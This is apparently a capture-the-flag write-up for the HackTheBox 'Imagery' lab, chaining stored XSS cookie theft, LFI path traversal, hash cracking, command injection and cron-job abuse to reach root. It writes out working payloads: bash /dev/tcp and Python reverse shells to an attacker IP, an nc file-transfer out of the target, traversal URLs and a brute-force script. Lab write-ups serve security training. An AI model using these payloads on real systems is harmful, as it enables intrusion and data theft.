# HTB-Imagery-Write-Up
HackTheBox Imagery Lab Write-up: Enumeration → XSS → LFI → RCE → PrivEsc

## Summary

This penetration test was executed via a structured enumeration and exploit chain, resulting in a full system compromise of the Imagery target. Initial access was gained by exploiting the "Bug Report" page with stored Cross-Site Scripting (XSS) to steal the admin user's session. This allowed for the exploitation of a Local File Inclusion (LFI) vulnerability to extract sensitive configuration files, which ultimately facilitated Remote Code Execution (RCE) and initial access as the low-privileged 'web' user. Privilege escalation was achieved by cracking a vulnerable AES encryption key and exploiting a misconfigured scheduled task (via a custom binary), leading to a full system compromise.

## Lab Environment

| Attacking Machine | Target Machine |
|---|---|
| IP: 10.10.14.X | IP: 10.10.11.88 |
| OS: Linux (Kali)| OS: Linux (Ubuntu) |
| Tools: Nmap, Burp Suite, Hashcat, Netcat | Difficulty Rating: Medium |

## 1. Reconnaissance & Enumeration
Initial TCP enumeration revealed that port 22 (SSH) and port 8000 (HTTP) were open, and the HTTP web application became high-priority for initial access. The TCP scan was executed with the following Nmap command:

```
bash

nmap -sV 10.10.11.88
```
---
<img width="669" height="74" alt="image" src="https://github.com/user-attachments/assets/8159ff5e-ae81-4b3c-9167-1598d2d7c811" />

## 2. Web Application Enumeration

Browsing to the address `http://10.10.11.88:8000/` revealed the web application 'Imagery,' which served as an online photo gallery where users could upload and edit their images. The navigation bar on the home page gave users the option to 'Login or Register.' After registering and logging in to the application, the options for 'Upload or Gallery' became available. The immediate approach began with testing for unrestricted file uploads or bypassing extension filters. The 'Upload' function only accepted image files (JPG, PNG, GIF, BMP, TIFF). An attempt to upload a double extension file and a polyglot file combining a malicious script with a simple JPEG of a cat. Both attempts failed, and the next approach was to alter the HTTP headers using Burp Suite to trick the web application into reading the malicious script rather than the image. Ultimately the 'Upload' function was deemed not effective, and pivoting to a different method was required. 

### 2.1 Vulnerability: Stored Cross-Site Scripting (XSS)

While scanning the web application for any potential attack vectors, a 'Report Bug' option was found. The 'Report Bug' page allowed users to send a comment in an input field. First we can test for stored XSS against the input field by using a cookie-stealing payload. To capture the admin's session cookie, we configure a listener on port 8081 using Netcat:

```
bash

nc -lvnp 8081
```

Now we can inject a test payload into the input field using the following script: 

```
html

:8081/?c='+document.cookie">
```

After a short moment, a connection was established, and the admin user's session cookie was captured:

<img width="902" height="39" alt="image" src="https://github.com/user-attachments/assets/d6b6396d-34eb-4d8f-b79f-affe534580e8" />

---

Now with the admin user's cookie, within the browser's developer tools, our current cookie session was replaced with the captured cookie string. After a refresh of the page, the option for 'Admin Panel' was available in the navigation bar. Navigating to the 'Admin Panel' revealed two users (admin@imagery.htb and testuser@imagery.htb) with the option to 'Download Log' for either user. Downloading the log revealed a clue in the URL parameter for potential LFI. The URL parameter read:

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=admin%40imagery.htb.log
```

### 2.2 Vulnerability: Local File Inclusion (LFI)

Inside the URL string, the parameter name `log_identifier=` suggested that the application was reading a file, which immediately made it a target for LFI. An LFI test to read a sensitive file was performed using the following URL parameter:

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../etc/passwd
```

The `passwd` file was successfully downloaded via the browser, confirming the web application was vulnerable to LFI. The LFI vulnerability is now our pivot point to extract crucial configuration files and application source code, which could point to another attack vector. After extensive focused path traversal, two critical files were successfully extracted: `api_edit.py` and `db.json`. The application files were extracted with the following paths:

```
http://10.10.11.88:8000/admin/get_system_log?log_identifier=../api_edit.py

http://10.10.11.88:8000/admin/get_system_log?log_identifier=../db.json
```

Searching the `db.json` file revealed sensitive credentials, listing the usernames 'admin@imagery.htb' and 'testuser@imagery.htb' and what seemed to be hashed passwords:

<img width="396" height="248" alt="image" src="https://github.com/user-attachments/assets/40095f38-eed9-4676-8179-01a55881ff5a" />

---

The 32 character string in the `password` fields pointed to the hash algorithm MD5, which would be mode zero `-m 0` for our hash cracking tool: hashcat.
After creating a new file with the hash strings included, 'imagery.hash,' the following command was performed:

```
bash

hashcat -m 0 imagery.hash /path/to/wordlist/rockyou.txt --force
```

The crack was successful, and the plaintext password was revealed:

<img width="345" height="22" alt="image" src="https://github.com/user-attachments/assets/26ff710d-e94a-4037-8bce-28646d9b7a19" />

---
> ***Note: The password for 'admin' was unsuccessfully cracked. Later in the module: '4. Initial Privilege Escalation': we discovered an exposed plaintext password for the user 'admin@imagery.htb'***

Now with the credentials for the user 'testuser@imagery.htb,' we can log in to the web application as 'testuser' if need be. We can also check if the password 'ia*****an' is reused for other services, such as SSH. An attempt to log in as 'testuser' was blocked, indicating that password authentication is disabled:

<img width="420" height="42" alt="image" src="https://github.com/user-attachments/assets/254310ff-c530-4b35-9918-b7a338e8fc28" />

---

Since the extracted credentials for 'testuser' didn't result in any key findings, we can analyze the source code of `api_edit.py` for possible attack vectors. For the initial search of the source code, we can look for common Python modules that execute external operating system commands, such as:
+ subprocess.run
+ os.system
+ subprocess.Popen
+ os.popen

---

Analysis of these modules proved to be a dead end. However, a deeper look at the `apply_visual_transform` function exposed a command injection flaw within the `crop` logic. The `command` variable uses a Python f-string `f"{...}"` to construct an external shell command, which incorporates user-controlled variables such as `width` and `height` into the final executed string. This key finding points to possible exploitation of Remote Code Execution (RCE).  

### 2.3 Vulnerability: Remote Code Execution (RCE)

We can now pivot to testing for RCE. To trigger the vulnerable code path, we must locate and interact with the 'Crop' function on the web application. While still in the admin user's session, we can upload a test image to perform the 'Crop' function; we'll use the JPEG of the cute kitty from earlier. After uploading an image to the application, we see the following options for our image:
+ Edit Details
+ Convert Format
+ **Transform Image**
+ Delete Metadata

---

We've now identified the 'Transform' function as the location of the command injection flaw. However, attempting to use the function results in an error: Feature still in production. This suggests the feature is currently disabled. Given this, it is possible the user 'testuser@imagery.htb' has access to unreleased features, such as the 'Transform' function. Since we've already extracted credentials for this account, we can test our theory by logging in as 'testuser@imagery.htb,' using the cracked password 'ia*****an.' Upon successful authentication, our theory was confirmed and we're now able to use the 'Transform' and 'Crop' functions. In order to test the command injection flaw we discovered, we will use Burp Suite to alter the 'POST Request' by adding a malicious payload. Once we intercept the 'POST Request,' we can inject a reverse shell script in the `x` value to exploit the vulnerable Python f-string, which passes our command to the underlying operating system to execute. 

## 3. Initial Access: Utilizing Remote Code Execution (RCE)

With our attack vector established, first we configure a listener on port 4444 using Netcat:

```
bash

nc -lvnp 4444
```

Now that we are listening on port 4444, we can send the malicious 'POST Request' with our complete RCE test payload:

```
json

{
  "imageId":"7b301a1a-23c8-4d8e-9eda-a6e7fbcd2525",
  "transformType":"crop",
  "params":{
    "x": "0; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'",
    "y":0,
    "width":259,
    "height":194
  }
}
```

A connection was established and confirmed RCE; however, the shell was unstable and closed immediately. By adding `& sleep 10` to the end of our reverse shell, the connection became stable, and the final payload was:

```
json

"x": "0; bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' & sleep 10"
```

We now have a stable shell as the user 'web' and can pivot to privilege escalation.

## 4. Intermediate Privilege Escalation

First, we can run the 'linpeas.sh' script to perform automated system enumeration and identify potential privilege escalation vectors. To transfer the script, we configured a simple Python HTTP server on our attacking machine to host the file:

```
bash

python3 -m http.server 80
```

From the target machine, we can run `wget` to download the 'linpeas.sh' script and then make the file executable with the following commands:

```
bash

wget http://<YOUR_IP>/linpeas.sh
chmod +x linpeas.sh
```

With the 'linpeas.sh' script now on the target machine and executable, we can run the script:

```
bash

./linpeas.sh
```

Once the script was completed, an extensive search was performed through the 'linpeas.sh' script output. Multiple potential vectors were established, such as the user 'mark' in the `/home/mark` directory, which ultimately resulted in dead ends. However, while continuing initial enumeration, a plaintext password was found for the user 'admin@imagery.htb' in the file `/home/web/web/bot/admin.py`:

<img width="460" height="38" alt="image" src="https://github.com/user-attachments/assets/7c0ef33e-bce7-412d-96ef-976e6132d39b" />

> ***Since our previous attempt to login as 'testuser@imagery.htb' with SSH failed, we will keep the exposed password 'st*************ch' up our sleeve for now.***

---

After additional enumeration, the directory `/var/backup/` yielded a high-priority file `web_20250806_120723.zip.aes`, which was encrypted with AES (Advanced Encryption Standard). This file could contain privileged credentials or other critical information we need to escalate our current privileges. First we need to decrypt the `web_20250806_120723.zip.aes` file by finding the 'Key' or 'Decryption Passphrase.' After a thorough review of the 'linpeas.sh' script, under the section 'Executable files potentially added by user,' an interesting file `/usr/local/bin/pyAesCrypt` was found. To read its contents, the following `cat` command was performed as:

```
bash

cat /usr/local/bin/pyAesCrypt
```

While a plaintext password was not found, a valuable password policy was found: The password must contain uppercase, lowercase, digits, symbols, and be at least 12 characters long.

<img width="493" height="129" alt="image" src="https://github.com/user-attachments/assets/30d05ed9-4473-4b04-ad76-75dcfd902b0d" />

---

We now know what the password must contain but have to continue searching for the AES 'Key.' After thorough searching, the `CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p/runL!` was found and matched the password policy; however,using the token as the decryption password failed. After an extensive search, with no promising findings, we transfer the `web_20250806_120723.zip.aes` to our attacking machine to attempt brute-forcing the encryption with the following commands:
- From our attacking machine, we configure a listener to download the `web_20250806_120723.zip.aes` file:

```
bash

nc -lvnp 8081 > web_20250806_120723.zip.aes
```

- From the target machine we attempt to transfer the file to our attacking machine:

```
bash
    
cat /var/backup/web_20250806_120723.zip.aes | nc <YOUR_IP> 8081
```

Our Netcat listener receives a connection, and after a moment we have successfully transferred the `web_20250806_120723.zip.aes` file to our attacking machine:

We know that the '.aes' file uses the decryption tool 'pyAesCrypt,' so we will install the tool using:

```
bash

pip install pyAesCrypt
```

Now we can create a Python script utilizing the 'pyAesCrypt' tool to attempt to brute-force the AES encrypted file. We create the file 'bruteforce.py' and write the brute-force script:

```
bash

nano bruteforce.py
```

Create a Python script:

```
python

import pyAesCrypt
import os

# Defined file paths / ensure the paths are correct
encrypted_file = 'web_20250806_120723.zip.aes'
wordlist_file = '/path/to/rockyou.txt'
output_file = 'decrypted_web_backup.zip'

with open(wordlist_file, 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()

        # Skips blank lines in the wordlist file
        if not password:
            continue

        # Attempts decryption
        try:
            pyAesCrypt.decryptFile(encrypted_file, output_file, password)

            # If the script reaches this line, the decryption was successful
            print(f"\n[!] Password found: {password}")
                
            break 

        except ValueError:
            # Failed decryption (wrong password), and continues to the next line
            pass
        except Exception as e:
            # Handles other errors (like file corruption)
            print(f"\n[*] An unexpected error occurred: {e}")
            pass

print("\n[*] Brute-force Complete.")
```

With our Python script compiled, we execute the command:

```
bash

python3 bruteforce.py
```

Our brute-force attack was successful, and we now have the decrypted passphrase and the decrypted file 'decrypted_web_backup.zip':

<img width="260" height="93" alt="image" src="https://github.com/user-attachments/assets/b101f768-4f98-4479-bcd5-b06a9e7cba12" />

---

Now that we have the decrypted '.zip' file, we can unzip and extract the contents to a new directory with the following command:

```
bash

unzip decrypted_web_backup.zip -d backup_contents
```

We change directories to the new 'backup_contents' and can begin a search for any exposed credentials or sensitive information. Since we decrypted a backup file for the 'web' user, we first check the `db.json` file for potential previous users such as 'mark,' who we previously found in `/home/mark`. The following commands were performed to search the contents of `db.json`:

```
bash

cd web
cat db.json
```

We uncovered the hashed password string '01c3d2e5*************f53e535' for the user 'mark@imagery.htb.' We can now save this hashed string to a new file, 'mark.hash,' and crack it with hashcat. Since the previous hashed string for the user 'testuser@imagery.htb' was hashed with the MD5 algorithm, we run the following command:

```
bash

hashcat -m 0 mark.hash /Path/to/wordlist/rockyou.txt --force
```

The crack was successful and we now have credentials for the user 'mark':

<img width="350" height="24" alt="image" src="https://github.com/user-attachments/assets/e383c07b-9fe4-4b75-bd1b-a81e1fed89a3" />

---

With the password for the user 'mark@imagery.htb' we can pivot from the 'web' user, and attempt to escalate to 'mark.'

---

Back on the target machine, we can perform a test to log in as 'mark,' with the password 'su******sh' by using the following command:

```
bash

su mark
```

The attempt was successful, and we are now logged in as the user 'mark':

<img width="383" height="73" alt="image" src="https://github.com/user-attachments/assets/c690577b-687b-44d4-bd9a-b246b42d31a4" />

---

After a simple search in `/home/mark`, we uncover the **user flag.**

## 5. Root Privilege Escalation

Now with upgraded privileges, we first check if the user 'mark' can run any binaries as root without a password via sudo with the following command:

```
bash

sudo -l
```
The command revealed one binary 'mark' is allowed to run as root:

<img width="421" height="42" alt="image" src="https://github.com/user-attachments/assets/d42a8fd3-09e6-4319-be12-e1412f8d39f1" />

### 5.1 Vulnerability: Custom Binary (Charcol)

An attempt to run 'charcol' with `sudo charcol` revealed the binary as an interactive shell with a custom Command-Line Interface (CLI). We see the required command to enter the interactive shell, as well as the option `-R, --reset-password-to-default` to potentially reset the 'master passphrase.'

We run the 'charcol' application to analyze how the custom binary works, and to potentially spawn a root shell. We can run the custom application with this command:

```
bash

sudo charcol shell
```

The application asks us for the "Charcol master passphrase," and without the passphrase we can't access the interactive shell. From our previous discovery of the `-R, --reset-password-to-default`, we attempt to reset the application's default password with the following command:

```
bash

sudo charcol -R
```

We see "Charcol application password has been reset to default (no password mode)" and can re-run `sudo charcol shell` without providing the 'master passphrase.'

We now have an interactive shell, and we run `help` to further identify how the application functions. We analyze the output and find a high-potential option for:

<img width="891" height="20" alt="image" src="https://github.com/user-attachments/assets/def934ed-b26a-46cf-ba3c-78708080d2c0" />

---

We also uncover, **"Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths."** We discovered these options under the "Automated Jobs (Cron)" section, which suggested we can inject arbitrary system commands that will run as root. We can configure a root command that will output the contents of where we think the root flag will be into a readable location in `/tmp`:

```
bash

auto add --schedule "* * * * *" --command "cat /root/root.txt > /tmp/root_flag.txt" --name "GET_ROOT_FLAG"
```

We see in the output that our command was successful and retrieved the root flag after waiting one minute for the cron job to execute:

<img width="1253" height="78" alt="image" src="https://github.com/user-attachments/assets/5fa4a895-bf71-476e-8232-4c955b36c0d8" />

---

Finally, we exit the 'charcol' shell and wait for up to a minute, then read the contents of `root.txt`:

```
bash

exit
cat /tmp/root_flag.txt
```

We successfully read the contents of `root.txt` and have solved the lab.

> ***"The root flag was secured through a limited, non-interactive cron job injection, which provided proof-of-concept for the vulnerability. To confirm full system ownership and establish persistence, the final step involves pivoting this injection to execute a reverse shell and gain an interactive root@ shell."***

Since we have confirmed the `auto add` command can inject and execute non-interactive commands as root, and we can now pivot to gaining an interactive `root@` shell. First we configure a listener on our attacking machine to catch the incoming root connection, then use the auto add command again, but replace the cat command with a reverse shell:

```
bash

auto add --schedule "* * * * *" --command "/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<YOUR_IP>\",8081));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'" --name "PYTHON_ROOT_SHELL" 
```

After a minute's wait, we successfully established a connection and gained a `root@` shell:

<img width="310" height="77" alt="image" src="https://github.com/user-attachments/assets/fab3017f-3a74-40f2-b1e3-b597bda98b3e" />

---

We have now fully compromised the target machine, achieving a persistent root shell by exploiting the custom binary `/usr/local/bin/charcol` which the user 'mark' had privileges to run without a password.

